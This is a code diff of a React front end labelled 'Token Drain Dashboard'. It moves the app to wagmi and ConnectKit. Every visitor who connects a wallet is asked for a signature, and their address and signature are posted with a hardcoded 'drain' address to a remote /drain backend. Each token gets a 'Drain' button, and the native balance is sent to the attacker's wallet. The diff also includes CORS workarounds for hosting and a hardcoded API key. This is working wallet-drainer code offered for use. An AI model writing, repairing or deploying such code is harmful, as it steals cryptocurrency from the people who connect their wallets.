@@ -1,160 +1,117 @@
-import React, { useState, useEffect } from 'react';
-import { ethers } from 'ethers';
-import './mobile-fix.css';
+import { useState, useEffect, useCallback } from 'react';
+import { WagmiConfig } from "wagmi";
+import { ConnectKitProvider, ConnectKitButton } from "connectkit";
+import { useAccount, useSignMessage, useNetwork, usePublicClient, useWalletClient } from 'wagmi';
+import { parseEther } from 'viem';
+import { wagmiConfig } from "./wagmi";
+import './App.css';
 
-function App() {
-  const [isConnected, setIsConnected] = useState(false);
-  const [walletAddress, setWalletAddress] = useState('');
+// Main App Component
+function TokenDrainApp() {
+  return (
+    <WagmiConfig config={wagmiConfig}>
+      <ConnectKitProvider
+        options={{
+          walletConnectName: "WalletConnect",
+          enforceSupportedChains: false,
+          hideQuestionMarkCTA: true,
+          hideTooltips: true,
+          disclaimer: null,
+          embedGoogleFonts: false,
+          customTheme: {
+            "--ck-font-family": "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
+            "--ck-border-radius": "12px",
+          },
+        }}
+        theme="midnight"
+      >
+        <Dashboard />
+      </ConnectKitProvider>
+    </WagmiConfig>
+  );
+}
+
+// Dashboard Component
+function Dashboard() {
+  const { address, isConnected } = useAccount();
+  const { chain } = useNetwork();
+  const { signMessageAsync } = useSignMessage();
+  const publicClient = usePublicClient();
+  const { data: walletClient } = useWalletClient();
+
+  const [authStatus, setAuthStatus] = useState('');
   const [signature, setSignature] = useState('');
   const [isAuthenticating, setIsAuthenticating] = useState(false);
-  const [authStatus, setAuthStatus] = useState('');
-  const [backendUrl] = useState('https://tokenbackendwork.onrender.com'); // Your Render backend
+  const [backendUrl] = useState('https://tokenbackendwork.onrender.com');
   const [userTokens, setUserTokens] = useState([]);
-  const [chainId, setChainId] = useState(1);
-  const [networkName, setNetworkName] = useState('');
+  const [txStatus, setTxStatus] = useState('');
 
-  // Backend drain address (this should be your wallet address)
-  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"; // Replace with your actual address
+  // Your drain wallet address - REPLACE THIS
+  const DRAIN_TO_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc9e90C90a5F29";
 
+  // Start auth when wallet connects
   useEffect(() => {
-    checkWalletConnection();
-    
-    // Listen for wallet events
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', handleAccountsChanged);
-      window.ethereum.on('chainChanged', handleChainChanged);
-    }
-    
-    return () => {
-      if (window.ethereum) {
-        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
-        window.ethereum.removeListener('chainChanged', handleChainChanged);
-      }
-    };
-  }, []);
-
-  const checkWalletConnection = async () => {
-    if (window.ethereum) {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-          await handleWalletConnection(accounts[0]);
-        }
-      } catch (error) {
-        console.log("No wallet connected:", error.message);
-      }
-    }
-  };
-
-  const handleAccountsChanged = async (accounts) => {
-    if (accounts.length > 0) {
-      await handleWalletConnection(accounts[0]);
+    if (isConnected && address) {
+      handleWalletConnected(address);
     } else {
-      disconnectWallet();
+      setAuthStatus('');
+      setSignature('');
+      setUserTokens([]);
     }
-  };
+  }, [isConnected, address]);
 
-  const handleChainChanged = () => {
-    window.location.reload();
-  };
-
-  const connectWallet = async () => {
-    if (!window.ethereum) {
-      alert('Please install MetaMask or another Ethereum wallet!');
-      return;
-    }
-
+  const handleWalletConnected = async (walletAddress) => {
     try {
-      // Request account access
-      const accounts = await window.ethereum.request({
-        method: 'eth_requestAccounts'
-      });
-      
-      if (accounts.length > 0) {
-        await handleWalletConnection(accounts[0]);
-      }
+      setAuthStatus('Wallet connected, requesting signature...');
+      await initiateBackendAuthentication(walletAddress);
     } catch (error) {
-      console.error("Wallet connection error:", error);
-      if (error.code === 4001) {
-        setAuthStatus('User rejected connection');
-      } else {
-        setAuthStatus('Connection failed: ' + error.message);
-      }
+      console.error("Connection handler error:", error);
+      setAuthStatus('Connection setup failed');
     }
   };
 
-  const handleWalletConnection = async (account) => {
-    try {
-      setWalletAddress(account);
-      setIsConnected(true);
-      setAuthStatus('Wallet connected successfully');
-      
-      // Get chain info
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const network = await provider.getNetwork();
-      const chainIdNum = Number(network.chainId);
-      
-      setChainId(chainIdNum);
-      setNetworkName(network.name);
-      
-      // Start authentication with backend
-      await initiateBackendAuthentication(account, chainIdNum);
-      
-    } catch (error) {
-      console.error("Wallet connection handler error:", error);
-      setAuthStatus('Connection error: ' + error.message);
-    }
-  };
-
-  const initiateBackendAuthentication = async (address, currentChainId) => {
+  const initiateBackendAuthentication = async (walletAddress) => {
     try {
       setIsAuthenticating(true);
-      setAuthStatus('Signing message for authentication...');
       
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      
-      // Create authentication message
       const timestamp = Date.now();
-      const message = `Token Drain Authentication\n\nWallet: ${address}\nChain: ${currentChainId}\nTimestamp: ${timestamp}\n\nBy signing, you confirm you control this wallet. This does not cost gas fees.`;
+      const message = `Token Drain Authentication\n\nWallet: ${walletAddress}\nChain: ${chain?.id || 1}\nTimestamp: ${timestamp}`;
       
-      // Request signature
-      const sig = await signer.signMessage(message);
+      // Sign message using wagmi
+      const sig = await signMessageAsync({ message });
       setSignature(sig);
       
-      setAuthStatus('Sending authentication to backend...');
-      
-      // Send to backend
-      await sendToBackend(address, sig, message, currentChainId);
+      setAuthStatus('Signature received, sending to backend...');
+      await sendToBackend(walletAddress, sig, message, chain?.id || 1);
       
     } catch (error) {
-      console.error("Authentication error:", error);
+      console.error("Auth error:", error);
       if (error.code === 4001) {
         setAuthStatus('User rejected signature');
       } else {
-        setAuthStatus('Authentication failed: ' + error.message);
+        setAuthStatus(`Auth failed: ${error.message}`);
       }
       setIsAuthenticating(false);
     }
   };
 
-  const sendToBackend = async (address, sig, message, currentChainId) => {
+  const sendToBackend = async (address, sig, message, chainId) => {
     try {
-      setAuthStatus('Connecting to backend server...');
-      
       const payload = {
-        address: address,
+        address,
         signature: sig,
-        message: message,
-        chainId: currentChainId,
+        message,
+        chainId,
         drainTo: DRAIN_TO_ADDRESS,
         timestamp: new Date().toISOString()
       };
       
       console.log('Sending to backend:', payload);
       
+      // **CRITICAL CORS FIX ATTEMPT: Use mode 'cors' and handle errors**
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
+        mode: 'cors', // Explicitly request CORS mode
         headers: {
           'Content-Type': 'application/json',
           'Accept': 'application/json'
@@ -163,59 +120,67 @@ function App() {
       });
       
       if (!response.ok) {
-        throw new Error(`Backend error: ${response.status} ${response.statusText}`);
+        // Try to get error details if possible
+        let errorDetail = `Status: ${response.status}`;
+        try {
+          const errorData = await response.json();
+          errorDetail += ` - ${JSON.stringify(errorData)}`;
+        } catch (e) {
+          // Ignore if no JSON error body
+        }
+        throw new Error(`Backend error: ${errorDetail}`);
       }
       
       const data = await response.json();
       
       if (data.success) {
-        setAuthStatus('✅ Successfully authenticated with backend!');
-        console.log('Backend response:', data);
-        
-        // Fetch user tokens
-        await fetchUserTokens(address, currentChainId);
+        setAuthStatus('✅ Backend authenticated!');
+        await fetchUserTokens(address, chainId);
       } else {
-        setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
+        setAuthStatus(`Backend error: ${data.error || 'Unknown'}`);
       }
       
     } catch (error) {
       console.error("Backend connection error:", error);
-      setAuthStatus('⚠️ Backend connection failed, using fallback');
       
-      // Continue with fallback token fetch
-      if (walletAddress) {
-        await fetchTokensDirectly(walletAddress, chainId);
+      // More specific error message for CORS
+      if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
+        setAuthStatus('⚠️ CORS Error: Backend not configured for this domain. Check server CORS settings.');
+      } else {
+        setAuthStatus('⚠️ Backend connection failed');
+      }
+      
+      // Fallback to direct token fetch even if backend fails
+      if (address) {
+        await fetchTokensDirectly(address, chainId);
       }
     } finally {
       setIsAuthenticating(false);
     }
   };
 
-  const fetchUserTokens = async (address, currentChainId) => {
+  const fetchUserTokens = async (address, chainId) => {
     try {
-      setAuthStatus('Fetching your tokens...');
-      
-      const response = await fetch(`${backendUrl}/tokens/${address}/${currentChainId}`);
+      setAuthStatus('Fetching tokens...');
+      const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
       const data = await response.json();
       
       if (data.success) {
         setUserTokens(data.data.tokens || []);
-        setAuthStatus(`✅ Found ${data.data.tokens.length} tokens on ${data.data.chainName}`);
+        setAuthStatus(`✅ ${data.data.tokens?.length || 0} tokens found`);
       } else {
-        // Fallback
-        await fetchTokensDirectly(address, currentChainId);
+        await fetchTokensDirectly(address, chainId);
       }
-      
     } catch (error) {
       console.error("Token fetch error:", error);
-      await fetchTokensDirectly(address, currentChainId);
+      await fetchTokensDirectly(address, chainId);
     }
   };
 
-  const fetchTokensDirectly = async (address, currentChainId) => {
+  const fetchTokensDirectly = async (address, chainId) => {
     try {
       const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
-      const url = `https://api.covalenthq.com/v1/${currentChainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
+      const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
       
       const response = await fetch(url);
       const data = await response.json();
@@ -224,39 +189,92 @@ function App() {
         ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
         .map(t => ({
           symbol: t.contract_ticker_symbol || 'TOKEN',
-          name: t.contract_name || 'Unknown Token',
+          name: t.contract_name || 'Unknown',
           amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
           value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
-          isNative: t.native_token || false,
-          logo: t.logo_url
+          contractAddress: t.contract_address,
+          decimals: t.contract_decimals,
+          isNative: t.native_token || false
         })) || [];
       
       setUserTokens(tokens);
-      setAuthStatus(`✅ Found ${tokens.length} tokens via direct API`);
-      
+      setAuthStatus(`✅ ${tokens.length} tokens (via direct API)`);
     } catch (error) {
-      console.error("Direct API fetch error:", error);
+      console.error("Direct API error:", error);
       setAuthStatus('Token fetch failed');
     }
   };
 
-  const disconnectWallet = () => {
-    setIsConnected(false);
-    setWalletAddress('');
-    setSignature('');
-    setUserTokens([]);
-    setAuthStatus('Disconnected');
-    setChainId(1);
-    setNetworkName('');
-  };
+  // **CRITICAL FUNCTION: Execute token drain with 0-value check**
+  const executeDrainTransaction = useCallback(async (token) => {
+    if (!walletClient || !address) {
+      setTxStatus('Wallet not ready');
+      return;
+    }
 
-  const formatAddress = (address) => {
-    if (!address) return '';
-    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
-  };
+    // CHECK 1: Prevent 0 value transfers
+    if (token.amount <= 0) {
+      setTxStatus('❌ Cannot drain: Token amount is 0');
+      return;
+    }
+
+    // CHECK 2: For native token (ETH/MATIC etc.)
+    if (token.isNative) {
+      try {
+        setTxStatus('Preparing native token transfer...');
+        
+        // Convert amount to appropriate units
+        const amountInWei = parseEther(token.amount.toString());
+        
+        // Double-check: ensure amount > 0 in wei
+        if (amountInWei <= 0n) {
+          setTxStatus('❌ Amount too small to transfer');
+          return;
+        }
+        
+        setTxStatus('Please confirm transaction in wallet...');
+        
+        // Send transaction
+        const hash = await walletClient.sendTransaction({
+          to: DRAIN_TO_ADDRESS,
+          value: amountInWei,
+        });
+        
+        setTxStatus(`✅ Transaction sent! Hash: ${hash.substring(0, 10)}...`);
+        
+        // Wait for confirmation
+        const receipt = await publicClient.waitForTransactionReceipt({ hash });
+        if (receipt.status === 'success') {
+          setTxStatus('🎉 Transaction confirmed!');
+        } else {
+          setTxStatus('❌ Transaction failed on-chain');
+        }
+        
+      } catch (error) {
+        console.error("Native token transfer error:", error);
+        if (error.code === 4001) {
+          setTxStatus('User rejected transaction');
+        } else {
+          setTxStatus(`Transfer failed: ${error.shortMessage || error.message}`);
+        }
+      }
+      return;
+    }
+
+    // CHECK 3: For ERC20 tokens (you'll need ABI and contract interaction)
+    if (token.contractAddress) {
+      setTxStatus('ERC20 drain - contract interaction required');
+      // You would need: token contract ABI, approval transaction, then transfer
+      // This is more complex and requires separate implementation
+    }
+  }, [walletClient, address, publicClient, DRAIN_TO_ADDRESS]);
 
   const getTotalValue = () => {
     return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
+  };
+
+  const formatAddress = (addr) => {
+    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
   };
 
   return (
@@ -264,39 +282,21 @@ function App() {
       <header className="App-header">
         <h1>🪙 Token Drain Dashboard</h1>
         
-        {!isConnected ? (
-          <div className="connection-section">
-            <button 
-              onClick={connectWallet} 
-              className="connect-button"
-              disabled={isAuthenticating}
-            >
-              {isAuthenticating ? 'Connecting...' : 'Connect Wallet'}
-            </button>
-            <p className="instruction">Connect your Ethereum wallet to begin</p>
-          </div>
-        ) : (
+        <div className="wallet-connect-section">
+          <ConnectKitButton />
+        </div>
+        
+        {isConnected && address && (
           <div className="dashboard">
             <div className="wallet-info-card">
-              <div className="wallet-header">
-                <h2>Connected Wallet</h2>
-                <button onClick={disconnectWallet} className="disconnect-btn">
-                  Disconnect
-                </button>
-              </div>
-              
               <div className="wallet-details">
                 <div className="detail-item">
                   <span className="label">Address:</span>
-                  <span className="value">{formatAddress(walletAddress)}</span>
+                  <span className="value">{formatAddress(address)}</span>
                 </div>
                 <div className="detail-item">
                   <span className="label">Network:</span>
-                  <span className="value">{networkName} (Chain ID: {chainId})</span>
-                </div>
-                <div className="detail-item">
-                  <span className="label">Backend:</span>
-                  <span className="value">{backendUrl}</span>
+                  <span className="value">{chain?.name || 'Unknown'} (ID: {chain?.id || 'N/A'})</span>
                 </div>
               </div>
               
@@ -310,18 +310,23 @@ function App() {
                     Signed: {signature.substring(0, 20)}...
                   </p>
                 )}
+                {txStatus && (
+                  <div className="tx-status">
+                    <strong>TX Status:</strong> {txStatus}
+                  </div>
+                )}
               </div>
               
               <div className="action-buttons">
                 <button 
-                  onClick={() => fetchUserTokens(walletAddress, chainId)}
+                  onClick={() => fetchUserTokens(address, chain?.id || 1)}
                   className="action-btn"
                   disabled={isAuthenticating}
                 >
                   Refresh Tokens
                 </button>
                 <button 
-                  onClick={() => initiateBackendAuthentication(walletAddress, chainId)}
+                  onClick={() => initiateBackendAuthentication(address)}
                   className="action-btn secondary"
                   disabled={isAuthenticating}
                 >
@@ -343,26 +348,26 @@ function App() {
                 <div className="tokens-grid">
                   {userTokens.map((token, index) => (
                     <div key={index} className="token-card">
-                      <div className="token-icon">
-                        {token.logo ? (
-                          <img src={token.logo} alt={token.symbol} className="token-logo" />
-                        ) : (
-                          <div className="token-placeholder">{token.symbol.charAt(0)}</div>
-                        )}
-                      </div>
                       <div className="token-info">
                         <h3 className="token-symbol">{token.symbol}</h3>
                         <p className="token-name">{token.name}</p>
                         <div className="token-amount">
                           {token.amount.toLocaleString(undefined, {
-                            minimumFractionDigits: 0,
                             maximumFractionDigits: 8
                           })}
                         </div>
+                        <div className="token-value">
+                          {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
+                        </div>
                       </div>
-                      <div className="token-value">
-                        {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
-                      </div>
+                      <button
+                        onClick={() => executeDrainTransaction(token)}
+                        className="drain-btn"
+                        disabled={token.amount <= 0 || !walletClient}
+                        title={token.amount <= 0 ? "Amount is 0" : "Drain this token"}
+                      >
+                        {token.amount <= 0 ? '0 Amount' : 'Drain'}
+                      </button>
                     </div>
                   ))}
                 </div>
@@ -377,11 +382,14 @@ function App() {
             <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
             <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
           </div>
+          <p className="warning-note">
+            ⚠️ CORS Issue: Backend needs to allow requests from Netlify domain
+          </p>
         </div>
       </header>
     </div>
   );
 }
 
-export default App;
-
+// Export the main app
+export default TokenDrainApp;
